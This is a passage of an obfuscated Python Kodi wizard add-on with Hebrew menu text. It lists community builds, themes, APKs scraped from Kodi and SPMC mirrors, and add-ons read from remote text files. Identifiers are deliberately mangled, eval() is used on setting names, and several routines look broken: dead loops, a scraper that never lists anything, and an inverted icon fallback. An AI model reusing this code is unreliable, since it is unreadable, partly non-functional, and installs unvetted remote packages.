		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2216
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2217
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2218
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2219
		addFile ('%s'%O0OO0OO00OOOO00O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2220
	else :#line:2221
		OOO00OO0OOOO00000 ,O0O0O0OO000O0O0OO ,O0000OO0OO0000OOO ,OO000O0O000OOO00O ,OOO00O00000O00O0O ,O000OO000O000OOO0 ,OOO000O00000OOO00 =wiz .buildCount ()#line:2222
		O0O0000000OO00OO0 =False ;O00000OOO0O00O00O =[]#line:2223
		if THIRDPARTY =='true':#line:2224
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O0000000OO00OO0 =True ;O00000OOO0O00O00O .append ('1')#line:2225
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O0000000OO00OO0 =True ;O00000OOO0O00O00O .append ('2')#line:2226
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O0000000OO00OO0 =True ;O00000OOO0O00O00O .append ('3')#line:2227
		O0OO000OO0O00OOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2228
		OO0O00OOO00O00O00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO000OO0O00OOO0 )#line:2229
		if OOO00OO0OOOO00000 ==1 and O0O0000000OO00OO0 ==False :#line:2230
			for O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ,O000O00OOO0OO0000 ,O00O0OO0O00O00O0O ,OOOO0O0OO00O0O000 ,OO00O0O000OOOOO0O ,O00OO0000OOOOOOO0 ,O0000OO000O00O000 ,O00OOOO00O000OO00 ,OO00O0O0OOOO0OO00 in OO0O00OOO00O00O00 :#line:2231
				if not SHOWADULT =='true'and O00OOOO00O000OO00 .lower ()=='yes':continue #line:2232
				if not DEVELOPER =='true'and wiz .strTest (O00O0OO0O0OO000O0 ):continue #line:2233
				viewBuild (OO0O00OOO00O00O00 [0 ][0 ])#line:2234
				return #line:2235
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2238
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2239
		if O0O0000000OO00OO0 ==True :#line:2240
			for O00OO0OO00OOOOO0O in O00000OOO0O00O00O :#line:2241
				O00O0OO0O0OO000O0 =eval ('THIRD%sNAME'%O00OO0OO00OOOOO0O )#line:2242
		if len (OO0O00OOO00O00O00 )>=1 :#line:2244
			if SEPERATE =='true':#line:2245
				for O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ,O000O00OOO0OO0000 ,O00O0OO0O00O00O0O ,OOOO0O0OO00O0O000 ,OO00O0O000OOOOO0O ,O00OO0000OOOOOOO0 ,O0000OO000O00O000 ,O00OOOO00O000OO00 ,OO00O0O0OOOO0OO00 in OO0O00OOO00O00O00 :#line:2246
					if not SHOWADULT =='true'and O00OOOO00O000OO00 .lower ()=='yes':continue #line:2247
					if not DEVELOPER =='true'and wiz .strTest (O00O0OO0O0OO000O0 ):continue #line:2248
					O00OO0OO0O0OOOO0O =createMenu ('install','',O00O0OO0O0OO000O0 )#line:2249
					addDir ('[%s] %s (v%s)'%(float (OOOO0O0OO00O0O000 ),O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ),'viewbuild',O00O0OO0O0OO000O0 ,description =OO00O0O0OOOO0OO00 ,fanart =O0000OO000O00O000 ,icon =O00OO0000OOOOOOO0 ,menu =O00OO0OO0O0OOOO0O ,themeit =THEME2 )#line:2250
			else :#line:2251
				if OO000O0O000OOO00O >0 :#line:2252
					O0O0O00OOOO00000O ='+'if SHOW17 =='false'else '-'#line:2253
					if SHOW17 =='true':#line:2255
						for O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ,O000O00OOO0OO0000 ,O00O0OO0O00O00O0O ,OOOO0O0OO00O0O000 ,OO00O0O000OOOOO0O ,O00OO0000OOOOOOO0 ,O0000OO000O00O000 ,O00OOOO00O000OO00 ,OO00O0O0OOOO0OO00 in OO0O00OOO00O00O00 :#line:2257
							if not SHOWADULT =='true'and O00OOOO00O000OO00 .lower ()=='yes':continue #line:2258
							if not DEVELOPER =='true'and wiz .strTest (O00O0OO0O0OO000O0 ):continue #line:2259
							OO0OOOO00OOO00OOO =int (float (OOOO0O0OO00O0O000 ))#line:2260
							if OO0OOOO00OOO00OOO ==17 :#line:2261
								O00OO0OO0O0OOOO0O =createMenu ('install','',O00O0OO0O0OO000O0 )#line:2262
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0OO00O0O000 ),O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ),'viewbuild',O00O0OO0O0OO000O0 ,description =OO00O0O0OOOO0OO00 ,fanart =O0000OO000O00O000 ,icon =O00OO0000OOOOOOO0 ,menu =O00OO0OO0O0OOOO0O ,themeit =THEME2 )#line:2263
				if OOO00O00000O00O0O >0 :#line:2264
					O0O0O00OOOO00000O ='+'if SHOW18 =='false'else '-'#line:2265
					if SHOW18 =='true':#line:2267
						for O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ,O000O00OOO0OO0000 ,O00O0OO0O00O00O0O ,OOOO0O0OO00O0O000 ,OO00O0O000OOOOO0O ,O00OO0000OOOOOOO0 ,O0000OO000O00O000 ,O00OOOO00O000OO00 ,OO00O0O0OOOO0OO00 in OO0O00OOO00O00O00 :#line:2269
							if not SHOWADULT =='true'and O00OOOO00O000OO00 .lower ()=='yes':continue #line:2270
							if not DEVELOPER =='true'and wiz .strTest (O00O0OO0O0OO000O0 ):continue #line:2271
							OO0OOOO00OOO00OOO =int (float (OOOO0O0OO00O0O000 ))#line:2272
							if OO0OOOO00OOO00OOO ==18 :#line:2273
								O00OO0OO0O0OOOO0O =createMenu ('install','',O00O0OO0O0OO000O0 )#line:2274
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0OO00O0O000 ),O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ),'viewbuild',O00O0OO0O0OO000O0 ,description =OO00O0O0OOOO0OO00 ,fanart =O0000OO000O00O000 ,icon =O00OO0000OOOOOOO0 ,menu =O00OO0OO0O0OOOO0O ,themeit =THEME2 )#line:2275
				if O0000OO0OO0000OOO >0 :#line:2276
					O0O0O00OOOO00000O ='+'if SHOW16 =='false'else '-'#line:2277
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O0O00OOOO00000O ,O0000OO0OO0000OOO ),'togglesetting','show16',themeit =THEME3 )#line:2278
					if SHOW16 =='true':#line:2279
						for O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ,O000O00OOO0OO0000 ,O00O0OO0O00O00O0O ,OOOO0O0OO00O0O000 ,OO00O0O000OOOOO0O ,O00OO0000OOOOOOO0 ,O0000OO000O00O000 ,O00OOOO00O000OO00 ,OO00O0O0OOOO0OO00 in OO0O00OOO00O00O00 :#line:2280
							if not SHOWADULT =='true'and O00OOOO00O000OO00 .lower ()=='yes':continue #line:2281
							if not DEVELOPER =='true'and wiz .strTest (O00O0OO0O0OO000O0 ):continue #line:2282
							OO0OOOO00OOO00OOO =int (float (OOOO0O0OO00O0O000 ))#line:2283
							if OO0OOOO00OOO00OOO ==16 :#line:2284
								O00OO0OO0O0OOOO0O =createMenu ('install','',O00O0OO0O0OO000O0 )#line:2285
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0OO00O0O000 ),O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ),'viewbuild',O00O0OO0O0OO000O0 ,description =OO00O0O0OOOO0OO00 ,fanart =O0000OO000O00O000 ,icon =O00OO0000OOOOOOO0 ,menu =O00OO0OO0O0OOOO0O ,themeit =THEME2 )#line:2286
				if O0O0O0OO000O0O0OO >0 :#line:2287
					O0O0O00OOOO00000O ='+'if SHOW15 =='false'else '-'#line:2288
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O0O00OOOO00000O ,O0O0O0OO000O0O0OO ),'togglesetting','show15',themeit =THEME3 )#line:2289
					if SHOW15 =='true':#line:2290
						for O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ,O000O00OOO0OO0000 ,O00O0OO0O00O00O0O ,OOOO0O0OO00O0O000 ,OO00O0O000OOOOO0O ,O00OO0000OOOOOOO0 ,O0000OO000O00O000 ,O00OOOO00O000OO00 ,OO00O0O0OOOO0OO00 in OO0O00OOO00O00O00 :#line:2291
							if not SHOWADULT =='true'and O00OOOO00O000OO00 .lower ()=='yes':continue #line:2292
							if not DEVELOPER =='true'and wiz .strTest (O00O0OO0O0OO000O0 ):continue #line:2293
							OO0OOOO00OOO00OOO =int (float (OOOO0O0OO00O0O000 ))#line:2294
							if OO0OOOO00OOO00OOO <=15 :#line:2295
								O00OO0OO0O0OOOO0O =createMenu ('install','',O00O0OO0O0OO000O0 )#line:2296
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0OO00O0O000 ),O00O0OO0O0OO000O0 ,O0OO0000O0OOOO0OO ),'viewbuild',O00O0OO0O0OO000O0 ,description =OO00O0O0OOOO0OO00 ,fanart =O0000OO000O00O000 ,icon =O00OO0000OOOOOOO0 ,menu =O00OO0OO0O0OOOO0O ,themeit =THEME2 )#line:2297
		elif OOO000O00000OOO00 >0 :#line:2298
			if O000OO000O000OOO0 >0 :#line:2299
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2301
			else :#line:2302
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2303
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2304
	setView ('files','viewType')#line:2305
def viewBuild (OOOOO0O0OOOOO00O0 ):#line:2307
	OO0OO0OOOOO0O0OOO =wiz .workingURL (SPEEDFILE )#line:2308
	if not OO0OO0OOOOO0O0OOO ==True :#line:2309
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2310
		addFile ('%s'%OO0OO0OOOOO0O0OOO ,'',themeit =THEME3 )#line:2311
		return #line:2312
	if wiz .checkBuild (OOOOO0O0OOOOO00O0 ,'version')==False :#line:2313
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2314
		addFile ('%s was not found in the builds list.'%OOOOO0O0OOOOO00O0 ,'',themeit =THEME3 )#line:2315
		return #line:2316
	OO0OO0000O000OOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2317
	OOO0OOO0OO0OO0O0O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOO0O0OOOOO00O0 ).findall (OO0OO0000O000OOO0 )#line:2318
	for O0OOO0O0O0OOO000O ,O000OO0000O0OO0O0 ,OOOOO0O0000OO0OO0 ,O000OOOO0000O0O0O ,O0OO0OOOOOOOOOOO0 ,O00OOO00OO0000O00 ,O00OO00O0O00O00O0 ,O00000O0OOO00000O ,OO0O00O0OOOOOOO00 ,O00000OO0O0O0OO0O in OOO0OOO0OO0OO0O0O :#line:2319
		O00OOO00OO0000O00 =O00OOO00OO0000O00 if wiz .workingURL (O00OOO00OO0000O00 )else ICON #line:2320
		O00OO00O0O00O00O0 =O00OO00O0O00O00O0 if wiz .workingURL (O00OO00O0O00O00O0 )else FANART #line:2321
		OOOOO0OOOOO0OOOOO ='%s (v%s)'%(OOOOO0O0OOOOO00O0 ,O0OOO0O0O0OOO000O )#line:2322
		if BUILDNAME ==OOOOO0O0OOOOO00O0 and O0OOO0O0O0OOO000O >BUILDVERSION :#line:2323
			OOOOO0OOOOO0OOOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOOO0OOOOO0OOOOO ,BUILDVERSION )#line:2324
		OOO0O0O0000OOO0O0 =int (float (KODIV ));OOOOOO0O0OOOO00O0 =int (float (O000OOOO0000O0O0O ))#line:2333
		if not OOO0O0O0000OOO0O0 ==OOOOOO0O0OOOO00O0 :#line:2334
			if OOO0O0O0000OOO0O0 ==16 and OOOOOO0O0OOOO00O0 <=15 :OO0OO000OOO0O0O00 =False #line:2335
			else :OO0OO000OOO0O0O00 =True #line:2336
		else :OO0OO000OOO0O0O00 =False #line:2337
		addFile ('התקנה','install',OOOOO0O0OOOOO00O0 ,'fresh',description =O00000OO0O0O0OO0O ,fanart =O00OO00O0O00O00O0 ,icon =O00OOO00OO0000O00 ,themeit =THEME1 )#line:2341
		if not O0OO0OOOOOOOOOOO0 =='http://':#line:2344
			if wiz .workingURL (O0OO0OOOOOOOOOOO0 )==True :#line:2345
				addFile (wiz .sep ('THEMES'),'',fanart =O00OO00O0O00O00O0 ,icon =O00OOO00OO0000O00 ,themeit =THEME3 )#line:2346
				OO0OO0000O000OOO0 =wiz .openURL (O0OO0OOOOOOOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2347
				OOO0OOO0OO0OO0O0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO0000O000OOO0 )#line:2348
				for OOOOOOO0OO0O00000 ,O0OOO0O00O0000O0O ,OO0000OO00000O0O0 ,O00OOO0O00OO0O0OO ,O00OO0OO0OOO0OOOO ,O00000OO0O0O0OO0O in OOO0OOO0OO0OO0O0O :#line:2349
					if not SHOWADULT =='true'and O00OO0OO0OOO0OOOO .lower ()=='yes':continue #line:2350
					OO0000OO00000O0O0 =OO0000OO00000O0O0 if OO0000OO00000O0O0 =='http://'else O00OOO00OO0000O00 #line:2351
					O00OOO0O00OO0O0OO =O00OOO0O00OO0O0OO if O00OOO0O00OO0O0OO =='http://'else O00OO00O0O00O00O0 #line:2352
					addFile (OOOOOOO0OO0O00000 if not OOOOOOO0OO0O00000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOOOOO0OO0O00000 ,'theme',OOOOO0O0OOOOO00O0 ,OOOOOOO0OO0O00000 ,description =O00000OO0O0O0OO0O ,fanart =O00OOO0O00OO0O0OO ,icon =OO0000OO00000O0O0 ,themeit =THEME3 )#line:2353
	setView ('files','viewType')#line:2354
def viewThirdList (OO000OOO00O0OO0OO ):#line:2356
	OOO0O00OOOOOOO00O =eval ('THIRD%sNAME'%OO000OOO00O0OO0OO )#line:2357
	OO000000O0OO000OO =eval ('THIRD%sURL'%OO000OOO00O0OO0OO )#line:2358
	OOOOO00O0000OO000 =wiz .workingURL (OO000000O0OO000OO )#line:2359
	if not OOOOO00O0000OO000 ==True :#line:2360
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2361
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2362
	else :#line:2363
		OOO0OO00000OOOO00 ,O0000O0OOOOOOOOO0 =wiz .thirdParty (OO000000O0OO000OO )#line:2364
		addFile ("[B]%s[/B]"%OOO0O00OOOOOOO00O ,'',themeit =THEME3 )#line:2365
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2366
		if OOO0OO00000OOOO00 :#line:2367
			for OOO0O00OOOOOOO00O ,OO00O0OO0O0000O0O ,OO000000O0OO000OO ,OOOOOOO000O0O0O00 ,O00OOO0OO0OOO0OO0 ,O000000O00O00O0O0 ,O000000O0O0OO00O0 ,O000O00O0OOOO00OO in O0000O0OOOOOOOOO0 :#line:2368
				if not SHOWADULT =='true'and O000000O0O0OO00O0 .lower ()=='yes':continue #line:2369
				addFile ("[%s] %s v%s"%(OOOOOOO000O0O0O00 ,OOO0O00OOOOOOO00O ,OO00O0OO0O0000O0O ),'installthird',OOO0O00OOOOOOO00O ,OO000000O0OO000OO ,icon =O00OOO0OO0OOO0OO0 ,fanart =O000000O00O00O0O0 ,description =O000O00O0OOOO00OO ,themeit =THEME2 )#line:2370
		else :#line:2371
			for OOO0O00OOOOOOO00O ,OO000000O0OO000OO ,O00OOO0OO0OOO0OO0 ,O000000O00O00O0O0 ,O000O00O0OOOO00OO in O0000O0OOOOOOOOO0 :#line:2372
				addFile (OOO0O00OOOOOOO00O ,'installthird',OOO0O00OOOOOOO00O ,OO000000O0OO000OO ,icon =O00OOO0OO0OOO0OO0 ,fanart =O000000O00O00O0O0 ,description =O000O00O0OOOO00OO ,themeit =THEME2 )#line:2373
def editThirdParty (O00OO0O00O00O00O0 ):#line:2375
	O0000O00O0OOO0OOO =eval ('THIRD%sNAME'%O00OO0O00O00O00O0 )#line:2376
	O000O0O0OOO0OOOOO =eval ('THIRD%sURL'%O00OO0O00O00O00O0 )#line:2377
	OOOOOOOO0O0OOOOOO =wiz .getKeyboard (O0000O00O0OOO0OOO ,'Enter the Name of the Wizard')#line:2378
	O0OO000O00OO00OO0 =wiz .getKeyboard (O000O0O0OOO0OOOOO ,'Enter the URL of the Wizard Text')#line:2379
	wiz .setS ('wizard%sname'%O00OO0O00O00O00O0 ,OOOOOOOO0O0OOOOOO )#line:2381
	wiz .setS ('wizard%surl'%O00OO0O00O00O00O0 ,O0OO000O00OO00OO0 )#line:2382
def apkScraper (name =""):#line:2384
	if name =='kodi':#line:2385
		O0OO0OOO00000OOO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2386
		OO000000O00O000O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2387
		O00O0O0OO0OOOOOOO =wiz .openURL (O0OO0OOO00000OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2388
		OOO0OOO0O00O0O0OO =wiz .openURL (OO000000O00O000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2389
		O00000OOO0000O000 =0 #line:2390
		O0OOO0O00OOO0O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O0O0OO0OOOOOOO )#line:2391
		OOOO0OO00O0OOOOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0OOO0O00O0O0OO )#line:2392
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2394
		O00000O0OOOOOO00O =False #line:2395
		for O0OOOOOOO000000OO ,name ,OOO00O00OO00OO000 ,O0O0OO00000O00O0O in O0OOO0O00OOO0O0O0 :#line:2396
			if O0OOOOOOO000000OO in ['../','old/']:continue #line:2397
			if not O0OOOOOOO000000OO .endswith ('.apk'):continue #line:2398
			if not O0OOOOOOO000000OO .find ('_')==-1 and O00000O0OOOOOO00O ==True :continue #line:2399
			try :#line:2400
				O000O0O0OOOOOOO00 =name .split ('-')#line:2401
				if not O0OOOOOOO000000OO .find ('_')==-1 :#line:2402
					O00000O0OOOOOO00O =True #line:2403
					O00OOO000O0OO0OO0 ,O0OOOO000O0OOO0OO =O000O0O0OOOOOOO00 [2 ].split ('_')#line:2404
				else :#line:2405
					O00OOO000O0OO0OO0 =O000O0O0OOOOOOO00 [2 ]#line:2406
					O0OOOO000O0OOO0OO =''#line:2407
				O0OOOO000O0000O0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O0OOOOOOO00 [0 ].title (),O000O0O0OOOOOOO00 [1 ],O0OOOO000O0OOO0OO .upper (),O00OOO000O0OO0OO0 ,COLOR2 ,OOO00O00OO00OO000 .replace (' ',''),COLOR1 ,O0O0OO00000O00O0O )#line:2408
				O00000OOOOOOOO0OO =urljoin (O0OO0OOO00000OOO0 ,O0OOOOOOO000000OO )#line:2409
				addFile (O0OOOO000O0000O0O ,'apkinstall',"%s v%s%s %s"%(O000O0O0OOOOOOO00 [0 ].title (),O000O0O0OOOOOOO00 [1 ],O0OOOO000O0OOO0OO .upper (),O00OOO000O0OO0OO0 ),O00000OOOOOOOO0OO )#line:2410
				O00000OOO0000O000 +=1 #line:2411
			except :#line:2412
				wiz .log ("Error on: %s"%name )#line:2413
		for O0OOOOOOO000000OO ,name ,OOO00O00OO00OO000 ,O0O0OO00000O00O0O in OOOO0OO00O0OOOOO0 :#line:2415
			if O0OOOOOOO000000OO in ['../','old/']:continue #line:2416
			if not O0OOOOOOO000000OO .endswith ('.apk'):continue #line:2417
			if not O0OOOOOOO000000OO .find ('_')==-1 :continue #line:2418
			try :#line:2419
				O000O0O0OOOOOOO00 =name .split ('-')#line:2420
				O0OOOO000O0000O0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O0OOOOOOO00 [0 ].title (),O000O0O0OOOOOOO00 [1 ],O000O0O0OOOOOOO00 [2 ],COLOR2 ,OOO00O00OO00OO000 .replace (' ',''),COLOR1 ,O0O0OO00000O00O0O )#line:2421
				O00000OOOOOOOO0OO =urljoin (OO000000O00O000O0 ,O0OOOOOOO000000OO )#line:2422
				addFile (O0OOOO000O0000O0O ,'apkinstall',"%s v%s %s"%(O000O0O0OOOOOOO00 [0 ].title (),O000O0O0OOOOOOO00 [1 ],O000O0O0OOOOOOO00 [2 ]),O00000OOOOOOOO0OO )#line:2423
				O00000OOO0000O000 +=1 #line:2424
			except :#line:2425
				wiz .log ("Error on: %s"%name )#line:2426
		if O00000OOO0000O000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2427
	elif name =='spmc':#line:2428
		OO0OO0OO00OO00O0O ='https://github.com/koying/SPMC/releases'#line:2429
		O00O0O0OO0OOOOOOO =wiz .openURL (OO0OO0OO00OO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2430
		O00000OOO0000O000 =0 #line:2431
		O0OOO0O00OOO0O0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00O0O0OO0OOOOOOO )#line:2432
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2434
		for name ,O0O0O00O0OOO0OOOO in O0OOO0O00OOO0O0O0 :#line:2436
			OOO00OOO000O0O0O0 =''#line:2437
			OOOO0OO00O0OOOOO0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0O0O00O0OOO0OOOO )#line:2438
			for OO00O00000O00OOO0 ,O00OOO000000O0O00 ,OO0OO000OOO0000O0 in OOOO0OO00O0OOOOO0 :#line:2439
				if OO0OO000OOO0000O0 .find ('armeabi')==-1 :continue #line:2440
				if OO0OO000OOO0000O0 .find ('launcher')>-1 :continue #line:2441
				OOO00OOO000O0O0O0 =urljoin ('https://github.com',OO00O00000O00OOO0 )#line:2442
				break #line:2443
		if O00000OOO0000O000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2445
def apkMenu (url =None ):#line:2447
	if url ==None :#line:2448
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2451
	if not APKFILE =='http://':#line:2452
		if url ==None :#line:2453
			OOO0O00O0O000O000 =wiz .workingURL (APKFILE )#line:2454
			OOOOOOOO00O0O00OO =uservar .APKFILE #line:2455
		else :#line:2456
			OOO0O00O0O000O000 =wiz .workingURL (url )#line:2457
			OOOOOOOO00O0O00OO =url #line:2458
		if OOO0O00O0O000O000 ==True :#line:2459
			OOOOO0O0O00OO0O0O =wiz .openURL (OOOOOOOO00O0O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2460
			OO00OOO0OO0O0OO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0O0O00OO0O0O )#line:2461
			if len (OO00OOO0OO0O0OO0O )>0 :#line:2462
				O00OOO0OOO0O0OOO0 =0 #line:2463
				for O0O000O0O0O000OOO ,O000O0O000OOOO00O ,url ,O00O00O00OOOO00OO ,OO0OOO00O0000O0O0 ,O0O000OOO0OOO0O00 ,O0O000OO00O0OOOO0 in OO00OOO0OO0O0OO0O :#line:2464
					if not SHOWADULT =='true'and O0O000OOO0OOO0O00 .lower ()=='yes':continue #line:2465
					if O000O0O000OOOO00O .lower ()=='yes':#line:2466
						O00OOO0OOO0O0OOO0 +=1 #line:2467
						addDir ("[B]%s[/B]"%O0O000O0O0O000OOO ,'apk',url ,description =O0O000OO00O0OOOO0 ,icon =O00O00O00OOOO00OO ,fanart =OO0OOO00O0000O0O0 ,themeit =THEME3 )#line:2468
					else :#line:2469
						O00OOO0OOO0O0OOO0 +=1 #line:2470
						addFile (O0O000O0O0O000OOO ,'apkinstall',O0O000O0O0O000OOO ,url ,description =O0O000OO00O0OOOO0 ,icon =O00O00O00OOOO00OO ,fanart =OO0OOO00O0000O0O0 ,themeit =THEME2 )#line:2471
					if O00OOO0OOO0O0OOO0 <1 :#line:2472
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2473
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2474
		else :#line:2475
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2476
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2477
			addFile ('%s'%OOO0O00O0O000O000 ,'',themeit =THEME3 )#line:2478
		return #line:2479
	else :wiz .log ("[APK Menu] No APK list added.")#line:2480
	setView ('files','viewType')#line:2481
def addonMenu (url =None ):#line:2483
	if not ADDONFILE =='http://':#line:2484
		if url ==None :#line:2485
			OO0OO00O0000OO0O0 =wiz .workingURL (ADDONFILE )#line:2486
			O0O0OOOOO0O00O0O0 =uservar .ADDONFILE #line:2487
		else :#line:2488
			OO0OO00O0000OO0O0 =wiz .workingURL (url )#line:2489
			O0O0OOOOO0O00O0O0 =url #line:2490
		if OO0OO00O0000OO0O0 ==True :#line:2491
			OOOO00000O0OO00OO =wiz .openURL (O0O0OOOOO0O00O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2492
			OO00OOOO00OO0OO0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO00000O0OO00OO )#line:2493
			if len (OO00OOOO00OO0OO0O )>0 :#line:2494
				O0OOOOOOOO000O000 =0 #line:2495
				for OO00OO00OO0OOOO0O ,OOO00OO000O00O0O0 ,url ,O000OOO0OOOO00OOO ,O0000000OO000OOO0 ,OOOOOO0O000000O0O ,OOOOO000O00000000 ,O000O00O0O00O00O0 ,OOOO0O00O0OO00O00 ,OO00O00O00OO00OOO in OO00OOOO00OO0OO0O :#line:2496
					if OOO00OO000O00O0O0 .lower ()=='section':#line:2497
						O0OOOOOOOO000O000 +=1 #line:2498
						addDir ("[B]%s[/B]"%OO00OO00OO0OOOO0O ,'addons',url ,description =OO00O00O00OO00OOO ,icon =OOOOO000O00000000 ,fanart =O000O00O0O00O00O0 ,themeit =THEME3 )#line:2499
					else :#line:2500
						if not SHOWADULT =='true'and OOOO0O00O0OO00O00 .lower ()=='yes':continue #line:2501
						try :#line:2502
							OO0O00OO0O0O000O0 =xbmcaddon .Addon (id =OOO00OO000O00O0O0 ).getAddonInfo ('path')#line:2503
							if os .path .exists (OO0O00OO0O0O000O0 ):#line:2504
								OO00OO00OO0OOOO0O ="[COLOR green][Installed][/COLOR] %s"%OO00OO00OO0OOOO0O #line:2505
						except :#line:2506
							pass #line:2507
						O0OOOOOOOO000O000 +=1 #line:2508
						addFile (OO00OO00OO0OOOO0O ,'addoninstall',OOO00OO000O00O0O0 ,O0O0OOOOO0O00O0O0 ,description =OO00O00O00OO00OOO ,icon =OOOOO000O00000000 ,fanart =O000O00O0O00O00O0 ,themeit =THEME2 )#line:2509
					if O0OOOOOOOO000O000 <1 :#line:2510
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2511
			else :#line:2512
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2513
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2514
		else :#line:2515
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2516
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2517
			addFile ('%s'%OO0OO00O0000OO0O0 ,'',themeit =THEME3 )#line:2518
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2519
	setView ('files','viewType')#line:2520
def addonInstaller (O00000OOO0OO0O00O ,OO00O0O00O0O0O000 ):#line:2522
	if not ADDONFILE =='http://':#line:2523
